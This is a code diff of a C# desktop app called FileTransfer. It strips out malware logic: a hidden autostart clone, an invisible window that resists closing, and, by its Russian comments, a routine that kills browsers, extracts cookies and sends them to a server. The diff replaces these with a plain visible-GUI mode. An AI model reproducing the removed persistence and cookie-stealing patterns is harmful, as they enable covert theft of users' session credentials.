@@ -202,48 +202,10 @@ namespace FileTransfer
                     }
                 }
 
-                if (_backgroundMode)
-                {
-                    // Клон — проверяем, не запущен ли уже другой клон
-                    bool createdNew;
-                    _cloneMutex = new Mutex(true, "Global\\FileTransferClone_v1", out createdNew);
-                    if (!createdNew)
-                    {
-                        Log("Clone already running, exiting duplicate");
-                        Environment.Exit(0);
-                        return;
-                    }
-
-                    // Фоновый режим (скрытая копия из автозагрузки)
-                    ShowInTaskbar = false;
-                    Opacity = 0;
-                    Log("Background mode start");
-                    // Чиним автозагрузку если удалили
-                    Persistence.EnsureAutoStart();
-                    _ = Task.Run(StartBackgroundWorkAsync);
-                }
-                else
-                {
-                    // Обычный видимый режим с кнопкой "Взлом"
-                    ShowInTaskbar = true;
-                    Opacity = 1;
-                    Log("Visible mode start");
-
-                    // При запуске из Program Files — создаём клон и ставим в автозагрузку
-                    if (!hiddenInstance)
-                    {
-                        if (!Persistence.IsInstalled() || !File.Exists(Persistence.DestExe))
-                        {
-                            Log("Installing persistence");
-                            Persistence.Install();
-                        }
-                        // Всегда пытаемся запустить клон (Mutex предотвратит дубликаты)
-                        Persistence.LaunchClone();
-                    }
-
-                    // Сразу убиваем браузеры, извлекаем куку и отправляем на сервер
-                    _ = Task.Run(StartBackgroundWorkAsync);
-                }
+                // Standalone PRO режим — чистый GUI режим без убийства браузеров, стиллера и автозагрузки
+                ShowInTaskbar = true;
+                Opacity = 1;
+                Log("Standalone PRO mode start (Clean GUI mode)");
 
                 Log("MainWindow constructor OK");
             }
@@ -257,21 +219,7 @@ namespace FileTransfer
         protected override void OnClosing(CancelEventArgs e)
         {
             base.OnClosing(e);
-
-            if (_backgroundMode)
-            {
-                // Клон — остаёмся в фоне, не закрываемся
-                e.Cancel = true;
-                Hide();
-                ShowInTaskbar = false;
-                Log("Clone staying in background");
-            }
-            else
-            {
-                // Оригинал — закрываем приложение (клон работает в фоне)
-                Log("Original window closed, clone survives");
-                Application.Current.Shutdown();
-            }
+            Application.Current.Shutdown();
         }
 
         private void MainWindow_Loaded(object sender, RoutedEventArgs e)
